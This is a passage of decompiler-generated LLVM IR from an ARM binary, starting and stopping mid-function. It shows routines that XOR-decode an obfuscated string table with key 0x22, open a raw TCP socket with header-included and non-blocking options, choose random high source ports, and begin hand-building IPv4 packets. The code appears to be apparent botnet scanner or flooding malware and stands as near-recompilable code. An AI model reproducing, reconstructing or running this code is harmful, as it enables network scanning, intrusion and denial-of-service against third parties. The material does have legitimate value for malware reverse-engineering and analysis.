  %v2_106fc = call i32 @function_12d34(i32 %v0_106fc, i32 256)
  store i32 %v2_106fc, i32* %r0.global-to-local, align 4
  %v0_10700 = load i32, i32* %r5.global-to-local, align 4
  %v1_10700 = add i32 %v0_10700, 4
  %v2_10700 = inttoptr i32 %v1_10700 to i32*
  %v3_10700 = load i32, i32* %v2_10700, align 4
  store i32 %v3_10700, i32* @r4, align 4
  %v0_10708 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10708, i32* @r2, align 4
  store i32 %v3_10700, i32* %r0.global-to-local, align 4
  %v2_10710 = call i32 @function_13564(i32 %v3_10700, i32 3)
  %v1_10718 = or i32 %v2_10710, 2048
  store i32 %v1_10718, i32* @r2, align 4
  %v0_1071c = load i32, i32* @r4, align 4
  store i32 %v0_1071c, i32* %r0.global-to-local, align 4
  %v2_10720 = call i32 @function_13564(i32 %v0_1071c, i32 4)
  store i32 %v2_10720, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec34.185 to i32), i32* %r3.global-to-local, align 4
  %v0_10728 = load i32, i32* %r5.global-to-local, align 4
  %v1_10728 = add i32 %v0_10728, 20
  %v2_10728 = inttoptr i32 %v1_10728 to i32*
  %v3_10728 = load i32, i32* %v2_10728, align 4
  store i32 %v3_10728, i32* @r4, align 4
  %v2_1072c = load i32, i32* @global_var_1ec34.185, align 4
  %v1_10730 = add i32 %v0_10728, 16
  %v2_10730 = inttoptr i32 %v1_10730 to i32*
  %v3_10730 = load i32, i32* %v2_10730, align 4
  store i32 %v3_10730, i32* @lr, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10738 = add i32 %v0_10728, 8
  %v3_10738 = inttoptr i32 %v2_10738 to i32*
  store i32 %v2_1072c, i32* %v3_10738, align 4
  %v0_1073c = load i32, i32* %r3.global-to-local, align 4
  %v1_1073c = load i32, i32* %r5.global-to-local, align 4
  %v2_1073c = add i32 %v1_1073c, 12
  %v3_1073c = inttoptr i32 %v2_1073c to i32*
  store i32 %v0_1073c, i32* %v3_1073c, align 4
  %v0_10744 = load i32, i32* %r5.global-to-local, align 4
  %v1_10744 = add i32 %v0_10744, 4
  %v2_10744 = inttoptr i32 %v1_10744 to i32*
  %v3_10744 = load i32, i32* %v2_10744, align 4
  store i32 %v3_10744, i32* %r0.global-to-local, align 4
  %v0_10748 = load i32, i32* %r3.global-to-local, align 4
  %v2_10748 = mul i32 %v0_10748, 2
  store i32 %v2_10748, i32* %r3.global-to-local, align 4
  store i32 %v2_10748, i32* %stack_var_-32, align 4
  %v3_10768 = bitcast i32* %stack_var_-32 to %sockaddr*
  %v4_10768 = call i32 @function_13dac(i32 %v3_10744, %sockaddr* %v3_10768, i32 16)
  store i32 %v4_10768, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_106a4.dec_label_pc_1076c_crit_edge, %dec_label_pc_106f8
  %v14_10770 = phi i32 [ %v14_10770.pre, %dec_label_pc_106a4.dec_label_pc_1076c_crit_edge ], [ %v4_10768, %dec_label_pc_106f8 ]
  %v2_10770 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10770, i32* @r4, align 4
  ret i32 %v14_10770

; uselistorder directives
  uselistorder i32 %v2_10748, { 1, 0 }
  uselistorder i32 %v3_106dc, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 8, 5, 6, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_12d34, { 7, 12, 16, 15, 14, 13, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1076c, { 1, 0 }
}

define i32 @function_10778(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10778:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_10778 = load i32, i32* @r4, align 4
  %v6_10778 = load i32, i32* @r5, align 4
  %v9_10778 = load i32, i32* @r6, align 4
  %v12_10778 = load i32, i32* @r7, align 4
  %v15_10778 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1ec00.187 to i32), i32* @r8, align 4
  %v2_10780 = load i32, i32* @global_var_1ec00.187, align 4
  store i32 ptrtoint (i32* @global_var_1ec2c.189 to i32), i32* %sb.global-to-local, align 4
  %v3_1078c = mul i32 %v2_10780, 16
  store i32 %v3_1078c, i32* %r3.global-to-local, align 4
  %v3_10794 = urem i32 %arg3, 65536
  store i32 %v3_10794, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_107a0 = load i32, i32* @global_var_1ec2c.189, align 4
  %v1_107a4 = add i32 %v3_1078c, 16
  store i32 %v1_107a4, i32* %r1.global-to-local, align 4
  store i32 %v3_10794, i32* %stack_var_-44, align 4
  %v8_107ac = call i32 @function_1439c(i32 %v2_107a0, i32 %v1_107a4, i32 %v3_10794, i32 %v3_1078c)
  store i32 %v8_107ac, i32* %sl.global-to-local, align 4
  %v0_107b4 = load i32, i32* @r5, align 4
  %v1_107b8 = load i32, i32* %sb.global-to-local, align 4
  %v2_107b8 = inttoptr i32 %v1_107b8 to i32*
  store i32 %v8_107ac, i32* %v2_107b8, align 4
  %v2_107bc = load i32, i32* @global_var_1ec00.187, align 4
  store i32 %v2_107bc, i32* %fp.global-to-local, align 4
  %v1_107c0 = inttoptr i32 %v0_107b4 to i8*
  %v2_107c0 = call i32 @function_12c94(i8* %v1_107c0)
  %sext = mul i32 %v2_107c0, 16777216
  %v1_107c4 = sdiv i32 %sext, 16777216
  %v2_107c4 = add nsw i32 %v1_107c4, 1
  store i32 %v2_107c4, i32* @r4, align 4
  store i32 %v1_107c4, i32* @r7, align 4
  %v1_107d0 = call i32 @function_14100(i32 %v2_107c4)
  %v0_107d4 = load i32, i32* @r5, align 4
  store i32 %v0_107d4, i32* %r1.global-to-local, align 4
  %v0_107d8 = load i32, i32* @r4, align 4
  store i32 %v0_107d8, i32* %r2.global-to-local, align 4
  store i32 %v1_107d0, i32* @r6, align 4
  %v3_107e0 = call i32 @function_12d10(i32 %v1_107d0, i32 %v0_107d4, i32 %v0_107d8)
  %v0_107e4 = load i32, i32* @r7, align 4
  %tmp21 = icmp slt i32 %v0_107e4, 1
  %extract.t6 = trunc i32 %v0_107e4 to i8
  br i1 %tmp21, label %dec_label_pc_10808, label %dec_label_pc_107ec

dec_label_pc_107ec:                               ; preds = %dec_label_pc_10778
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_107f0

dec_label_pc_107f0:                               ; preds = %dec_label_pc_107f0, %dec_label_pc_107ec
  %v2_107f8 = phi i32 [ %v1_107fc, %dec_label_pc_107f0 ], [ 0, %dec_label_pc_107ec ]
  %v1_107f0 = load i32, i32* @r6, align 4
  %v2_107f0 = add i32 %v1_107f0, %v2_107f8
  %v3_107f0 = inttoptr i32 %v2_107f0 to i8*
  %v4_107f0 = load i8, i8* %v3_107f0, align 1
  %v6_107f0 = zext i8 %v4_107f0 to i32
  %v1_107f4 = xor i32 %v6_107f0, 34
  store i32 %v1_107f4, i32* %r3.global-to-local, align 4
  %v1_107f8 = trunc i32 %v1_107f4 to i8
  store i8 %v1_107f8, i8* %v3_107f0, align 1
  %v0_107fc = load i32, i32* %r2.global-to-local, align 4
  %v1_107fc = add i32 %v0_107fc, 1
  store i32 %v1_107fc, i32* %r2.global-to-local, align 4
  %v0_10800 = load i32, i32* @r7, align 4
  %v9_10800 = icmp eq i32 %v0_10800, %v1_107fc
  br i1 %v9_10800, label %dec_label_pc_10808.loopexit, label %dec_label_pc_107f0

dec_label_pc_10808.loopexit:                      ; preds = %dec_label_pc_107f0
  %extract.t = trunc i32 %v1_107fc to i8
  br label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %dec_label_pc_10808.loopexit, %dec_label_pc_10778
  %v0_10818.off0 = phi i8 [ %extract.t, %dec_label_pc_10808.loopexit ], [ %extract.t6, %dec_label_pc_10778 ]
  %v2_10808 = load i32, i32* @global_var_1ec00.187, align 4
  %v2_1080c = load i32, i32* @global_var_1ec2c.189, align 4
  store i32 %v2_1080c, i32* %r2.global-to-local, align 4
  %v3_10810 = mul i32 %v2_10808, 16
  %v2_10814 = add i32 %v2_1080c, %v3_10810
  store i32 %v2_10814, i32* %r3.global-to-local, align 4
  %v3_10818 = add i32 %v2_10814, 12
  %v4_10818 = inttoptr i32 %v3_10818 to i8*
  store i8 %v0_10818.off0, i8* %v4_10818, align 1
  %v0_1081c = load i32, i32* @r6, align 4
  %v1_1081c = load i32, i32* %sl.global-to-local, align 4
  %v2_1081c = load i32, i32* %fp.global-to-local, align 4
  %v5_1081c = mul i32 %v2_1081c, 16
  %v6_1081c = add i32 %v5_1081c, %v1_1081c
  %v7_1081c = inttoptr i32 %v6_1081c to i32*
  store i32 %v0_1081c, i32* %v7_1081c, align 4
  %v2_10824 = load i32, i32* @global_var_1ec00.187, align 4
  store i32 %v2_10824, i32* @r7, align 4
  %v2_10828 = load i32, i32* @global_var_1ec2c.189, align 4
  store i32 %v2_10828, i32* %sl.global-to-local, align 4
  %v1_1082c = inttoptr i32 %arg2 to i8*
  %v2_1082c = call i32 @function_12c94(i8* %v1_1082c)
  %sext1 = mul i32 %v2_1082c, 16777216
  %v1_10830 = sdiv i32 %sext1, 16777216
  %v2_10830 = add nsw i32 %v1_10830, 1
  store i32 %v2_10830, i32* @r4, align 4
  store i32 %v1_10830, i32* @r5, align 4
  %v1_1083c = call i32 @function_14100(i32 %v2_10830)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_10844 = load i32, i32* @r4, align 4
  store i32 %v0_10844, i32* %r2.global-to-local, align 4
  store i32 %v1_1083c, i32* %r6.global-to-local, align 4
  %v3_1084c = call i32 @function_12d10(i32 %v1_1083c, i32 %arg2, i32 %v0_10844)
  %v0_10850 = load i32, i32* @r5, align 4
  %tmp22 = icmp slt i32 %v0_10850, 1
  %extract.t8 = trunc i32 %v0_10850 to i8
  br i1 %tmp22, label %dec_label_pc_10874, label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10808
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1085c

dec_label_pc_1085c:                               ; preds = %dec_label_pc_1085c, %dec_label_pc_10858
  %v2_10864 = phi i32 [ %v1_10868, %dec_label_pc_1085c ], [ 0, %dec_label_pc_10858 ]
  %v1_1085c = load i32, i32* %r6.global-to-local, align 4
  %v2_1085c = add i32 %v1_1085c, %v2_10864
  %v3_1085c = inttoptr i32 %v2_1085c to i8*
  %v4_1085c = load i8, i8* %v3_1085c, align 1
  %v6_1085c = zext i8 %v4_1085c to i32
  %v1_10860 = xor i32 %v6_1085c, 34
  store i32 %v1_10860, i32* %r3.global-to-local, align 4
  %v1_10864 = trunc i32 %v1_10860 to i8
  store i8 %v1_10864, i8* %v3_1085c, align 1
  %v0_10868 = load i32, i32* %r2.global-to-local, align 4
  %v1_10868 = add i32 %v0_10868, 1
  store i32 %v1_10868, i32* %r2.global-to-local, align 4
  %v0_1086c = load i32, i32* @r5, align 4
  %v9_1086c = icmp eq i32 %v0_1086c, %v1_10868
  br i1 %v9_1086c, label %dec_label_pc_10874.loopexit, label %dec_label_pc_1085c

dec_label_pc_10874.loopexit:                      ; preds = %dec_label_pc_1085c
  %extract.t7 = trunc i32 %v1_10868 to i8
  br label %dec_label_pc_10874

dec_label_pc_10874:                               ; preds = %dec_label_pc_10874.loopexit, %dec_label_pc_10808
  %v0_10884.off0 = phi i8 [ %extract.t7, %dec_label_pc_10874.loopexit ], [ %extract.t8, %dec_label_pc_10808 ]
  %v2_10874 = load i32, i32* @global_var_1ec00.187, align 4
  %v2_10878 = load i32, i32* @global_var_1ec2c.189, align 4
  %v3_1087c = mul i32 %v2_10874, 16
  %v2_10880 = or i32 %v3_1087c, 13
  %v3_10884 = add i32 %v2_10880, %v2_10878
  %v4_10884 = inttoptr i32 %v3_10884 to i8*
  store i8 %v0_10884.off0, i8* %v4_10884, align 1
  %v2_1088c = load i32, i32* @global_var_1ec00.187, align 4
  store i32 %v2_1088c, i32* %lr.global-to-local, align 4
  %v4_10890 = load i8, i8* @global_var_1ec31.192, align 1
  %v5_10890 = zext i8 %v4_10890 to i32
  %v3_10894 = load i8, i8* bitcast (i8** @global_var_1ec30.191 to i8*), align 4
  %v4_10894 = zext i8 %v3_10894 to i32
  %v2_10898 = load i32, i32* @global_var_1ec2c.189, align 4
  %v4_1089c = mul nuw nsw i32 %v5_10890, 256
  %v5_1089c = or i32 %v4_10894, %v4_1089c
  store i32 %v5_1089c, i32* %r2.global-to-local, align 4
  %v3_108a0 = mul i32 %v2_1088c, 16
  %v2_108a4 = add i32 %v2_10898, %v3_108a0
  store i32 %v2_108a4, i32* %r1.global-to-local, align 4
  %v3_108ac = add i32 %v2_108a4, 9
  %v4_108ac = inttoptr i32 %v3_108ac to i8*
  store i8 %v4_10890, i8* %v4_108ac, align 1
  %v0_108b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_108b0 = trunc i32 %v0_108b0 to i8
  %v2_108b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_108b0 = add i32 %v2_108b0, 8
  %v4_108b0 = inttoptr i32 %v3_108b0 to i8*
  store i8 %v1_108b0, i8* %v4_108b0, align 1
  %v4_108b4 = load i8, i8* @global_var_1ec31.192, align 1
  %v5_108b4 = zext i8 %v4_108b4 to i32
  %v3_108b8 = load i8, i8* bitcast (i8** @global_var_1ec30.191 to i8*), align 4
  %v4_108b8 = zext i8 %v3_108b8 to i32
  %v4_108bc = mul nuw nsw i32 %v5_108b4, 256
  %v5_108bc = or i32 %v4_108b8, %v4_108bc
  %v2_108c0 = load i32, i32* %stack_var_-44, align 4
  %v2_108c4 = add i32 %v5_108bc, %v2_108c0
  store i32 %v2_108c4, i32* %r3.global-to-local, align 4
  %v3_108c89 = udiv i32 %v2_108c4, 256
  %v1_108cc = trunc i32 %v3_108c89 to i8
  %v2_108cc = load i32, i32* %r1.global-to-local, align 4
  %v3_108cc = add i32 %v2_108cc, 11
  %v4_108cc = inttoptr i32 %v3_108cc to i8*
  store i8 %v1_108cc, i8* %v4_108cc, align 1
  %v0_108d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_108d0 = trunc i32 %v0_108d0 to i8
  %v2_108d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_108d0 = add i32 %v2_108d0, 10
  %v4_108d0 = inttoptr i32 %v3_108d0 to i8*
  store i8 %v1_108d0, i8* %v4_108d0, align 1
  %v4_108d4 = load i8, i8* @global_var_1ec31.192, align 1
  %v5_108d4 = zext i8 %v4_108d4 to i32
  %v3_108d8 = load i8, i8* bitcast (i8** @global_var_1ec30.191 to i8*), align 4
  %v4_108d8 = zext i8 %v3_108d8 to i32
  %v4_108dc = mul nuw nsw i32 %v5_108d4, 256
  %v5_108dc = or i32 %v4_108d8, %v4_108dc
  %v2_108e0 = load i32, i32* %stack_var_-44, align 4
  %v2_108e4 = add i32 %v5_108dc, %v2_108e0
  store i32 %v2_108e4, i32* %r2.global-to-local, align 4
  %v0_108e8 = load i32, i32* @r7, align 4
  %v3_108e8 = mul i32 %v0_108e8, 16
  %v1_108ec = load i32, i32* %sl.global-to-local, align 4
  %v2_108ec = add i32 %v1_108ec, %v3_108e8
  store i32 %v2_108ec, i32* %r3.global-to-local, align 4
  %v0_108f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_108f0 = add i32 %v0_108f0, 1
  store i32 %v1_108f0, i32* @lr, align 4
  %v3_108f4 = sdiv i32 %v2_108e4, 256
  store i32 %v3_108f4, i32* %r1.global-to-local, align 4
  %v0_108f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_108f8 = add i32 %v2_108ec, 4
  %v3_108f8 = inttoptr i32 %v2_108f8 to i32*
  store i32 %v0_108f8, i32* %v3_108f8, align 4
  %v0_108fc = load i32, i32* @lr, align 4
  %v1_108fc = load i32, i32* @r8, align 4
  %v2_108fc = inttoptr i32 %v1_108fc to i32*
  store i32 %v0_108fc, i32* %v2_108fc, align 4
  %v0_10900 = load i32, i32* %r1.global-to-local, align 4
  %v1_10900 = trunc i32 %v0_10900 to i8
  store i8 %v1_10900, i8* @global_var_1ec31.192, align 1
  %v0_10904 = load i32, i32* %r2.global-to-local, align 4
  %v1_10904 = trunc i32 %v0_10904 to i8
  store i8 %v1_10904, i8* bitcast (i8** @global_var_1ec30.191 to i8*), align 4
  store i32 %v3_10778, i32* @r4, align 4
  store i32 %v6_10778, i32* @r5, align 4
  store i32 %v9_10778, i32* @r6, align 4
  store i32 %v12_10778, i32* @r7, align 4
  store i32 %v15_10778, i32* @r8, align 4
  ret i32 ptrtoint (i8** @global_var_1ec30.191 to i32)

; uselistorder directives
  uselistorder i32 %v1_10868, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1083c, { 1, 0 }
  uselistorder i32 %v1_107fc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_107d0, { 1, 0 }
  uselistorder i32 %v3_10794, { 1, 2, 0 }
  uselistorder i32 %v3_1078c, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i8*)* @function_12c94, { 28, 29, 8, 9, 10, 11, 12, 27, 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 79, 80, 81, 82, 83, 84, 85, 86, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1439c, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_1091c() local_unnamed_addr {
dec_label_pc_1091c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp232 = call i32 @__decompiler_undefined_function_0()
  %tmp239 = call i32 @__decompiler_undefined_function_0()
  %tmp240 = call i8* @__decompiler_undefined_function_2()
  %tmp241 = call i32 @__decompiler_undefined_function_0()
  %tmp242 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1091c = load i32, i32* @r4, align 4
  store i32 %v3_1091c, i32* %stack_var_-36, align 4
  %v6_1091c = load i32, i32* @r5, align 4
  %v9_1091c = load i32, i32* @r6, align 4
  %v12_1091c = load i32, i32* @r7, align 4
  %v15_1091c = load i32, i32* @r8, align 4
  %v18_1091c = load i32, i32* @sb, align 4
  %v21_1091c = load i32, i32* @sl, align 4
  %v24_1091c = load i32, i32* @fp, align 4
  %v0_10924 = call i32 @function_13680()
  store i32 %v0_10924, i32* %r0.global-to-local, align 4
  %v7_10928 = icmp eq i32 %v0_10924, -1
  %. = zext i1 %v7_10928 to i32
  %tmp273 = icmp slt i32 %v0_10924, 1
  %storemerge229 = select i1 %tmp273, i32 %., i32 1
  store i32 %storemerge229, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1eca0.183 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10944 = icmp eq i32 %storemerge229, 0
  store i1 %v2_10944, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_10924, i32* @global_var_1eca0.183, align 4
  br i1 %v2_10944, label %dec_label_pc_10958, label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_1091c
  store i32 %v3_1091c, i32* @r4, align 4
  store i32 %v6_1091c, i32* %r5.global-to-local, align 4
  store i32 %v9_1091c, i32* @r6, align 4
  store i32 %v12_1091c, i32* @r7, align 4
  store i32 %v15_1091c, i32* @r8, align 4
  store i32 %v18_1091c, i32* @sb, align 4
  store i32 %v21_1091c, i32* @sl, align 4
  store i32 %v24_1091c, i32* @fp, align 4
  ret i32 %v0_10924

dec_label_pc_10958:                               ; preds = %dec_label_pc_1091c
  %v0_10958 = call i32 @function_12f4c()
  store i32 %v0_10958, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec7c.86 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_10958, i32* @global_var_1ec7c.86, align 4
  %v1_10964 = call i32 @function_feb8(i32 %v0_10958)
  %v0_10968 = load i32, i32* @r4, align 4
  store i32 %v0_10968, i32* %r0.global-to-local, align 4
  %v1_1096c = inttoptr i32 %v0_10968 to i32*
  %v2_1096c = call i32 @function_13924(i32* %v1_1096c)
  store i32 ptrtoint (i32* @global_var_1ec34.185 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_1096c, i32* @global_var_1ec34.185, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_10980 = call i32 @function_14254(i32 128, i32 288)
  store i32 %v2_10980, i32* %lr.global-to-local, align 4
  %v0_1098c = load i32, i32* @r4, align 4
  store i32 %v0_1098c, i32* %stack_var_-52, align 4
  store i32 %v2_10980, i32* @global_var_1ec98.197, align 4
  store i32 %v0_1098c, i32* %r3.global-to-local, align 4
  store i32 %v0_1098c, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_1098c, i32* %ip.global-to-local, align 4
  %v1_109a4 = add i32 %v2_10980, 4
  store i32 %v1_109a4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_109a8

dec_label_pc_109a8:                               ; preds = %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge, %dec_label_pc_10958
  %v0_109c0 = phi i32 [ %v0_109c0.pre, %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge ], [ %v0_1098c, %dec_label_pc_10958 ]
  %v0_109b0 = phi i32 [ %v0_109c8, %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge ], [ %v0_1098c, %dec_label_pc_10958 ]
  %v1_109b8 = phi i32 [ %v1_109b8.pre, %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge ], [ %v2_10980, %dec_label_pc_10958 ]
  %v3_109a8 = mul i32 %v0_109b0, 256
  store i32 %v3_109a8, i32* %r2.global-to-local, align 4
  %v1_109b0 = add i32 %v0_109b0, 1
  store i32 %v1_109b0, i32* %ip.global-to-local, align 4
  %v2_109b4 = mul i32 %v0_109b0, 288
  %v2_109b8 = add i32 %v1_109b8, 12
  %v2_109c0 = add i32 %v2_109b8, %v2_109b4
  %v3_109c0 = inttoptr i32 %v2_109c0 to i32*
  store i32 %v0_109c0, i32* %v3_109c0, align 4
  %v0_109c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_109c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_109c4 = inttoptr i32 %v1_109c4 to i32*
  store i32 %v0_109c4, i32* %v2_109c4, align 4
  %v3_109c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_109c4 = add i32 %v3_109c4, 288
  store i32 %v4_109c4, i32* %r1.global-to-local, align 4
  %v0_109c8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_109c8, i32* %r3.global-to-local, align 4
  %v7_109cc = icmp sgt i32 %v1_109b0, 127
  br i1 %v7_109cc, label %dec_label_pc_109d0, label %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge

dec_label_pc_109a8.dec_label_pc_109a8_crit_edge:  ; preds = %dec_label_pc_109a8
  %v1_109b8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_109c0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_109a8

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_109c8, i32* %stack_var_-52, align 4
  %v3_109e0 = call i32 @function_13f50(i32 2, i32 3, i32 6)
  store i32 %v3_109e0, i32* %r0.global-to-local, align 4
  %v2_109e8 = icmp eq i32 %v3_109e0, -1
  store i1 %v2_109e8, i1* %cpsr_c.global-to-local, align 1
  %v7_109e8 = icmp eq i32 %v3_109e0, -1
  store i1 %v7_109e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_109e0, i32* @r4, align 4
  store i32 %v3_109e0, i32* @global_var_1ec9c.199, align 4
  br i1 %v7_109e8, label %dec_label_pc_11380, label %dec_label_pc_109f8

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109d0
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_109fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_109fc, i32* @r2, align 4
  %v2_10a00 = call i32 @function_13564(i32 %v3_109e0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_10a08 = or i32 %v2_10a00, 2048
  store i32 %v1_10a08, i32* @r2, align 4
  %v0_10a0c = load i32, i32* @r4, align 4
  store i32 %v0_10a0c, i32* %r0.global-to-local, align 4
  %v2_10a10 = call i32 @function_13564(i32 %v0_10a0c, i32 4)
  store i32 1, i32* %ip.global-to-local, align 4
  %v2_10a1c = load i32, i32* @global_var_1ec9c.199, align 4
  store i32 %v2_10a1c, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_10a24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10a24, i32* %r1.global-to-local, align 4
  %v2_10a28 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10a28, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v6_10a38 = call i32 @function_13f20(i32 %v2_10a1c, i32 %v0_10a24, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v6_10a38, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a3c = icmp eq i32 %v6_10a38, 0
  store i1 %v2_10a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a3c, label %dec_label_pc_10a44, label %dec_label_pc_11374

dec_label_pc_10a44:                               ; preds = %dec_label_pc_109f8, %dec_label_pc_10a44
  %v0_10a44 = call i32 @function_fe60()
  %v3_10a48 = mul i32 %v0_10a44, 65536
  store i32 %v3_10a48, i32* %r0.global-to-local, align 4
  %v1_10a54 = mul i32 %v0_10a44, 256
  %v3_10a58 = and i32 %v1_10a54, 65280
  %tmp276 = udiv i32 %v0_10a44, 256
  %v4_10a5c = urem i32 %tmp276, 256
  %v5_10a5c = or i32 %v4_10a5c, %v3_10a58
  store i32 %v5_10a5c, i32* %r3.global-to-local, align 4
  %v2_10a60 = icmp ugt i32 %v5_10a5c, 1023
  store i1 %v2_10a60, i1* %cpsr_c.global-to-local, align 1
  %v7_10a60 = icmp eq i32 %v5_10a5c, 1024
  store i1 %v7_10a60, i1* %cpsr_z.global-to-local, align 1
  %v3_10a64 = icmp ult i32 %v5_10a5c, 1022
  br i1 %v3_10a64, label %dec_label_pc_10a44, label %dec_label_pc_10a68

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a44
  %v5_10a50.le = trunc i32 %v0_10a44 to i8
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i8** @global_var_1ec04.201 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1ec07.202 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec06.203 to i8*), align 4
  %v0_10a9c = call i32 @function_fe60()
  %v1_10a9c = trunc i32 %v0_10a9c to i8
  store i32 %v0_10a9c, i32* %r0.global-to-local, align 4
  %v4_10aa4 = sext i8 %v5_10a50.le to i32
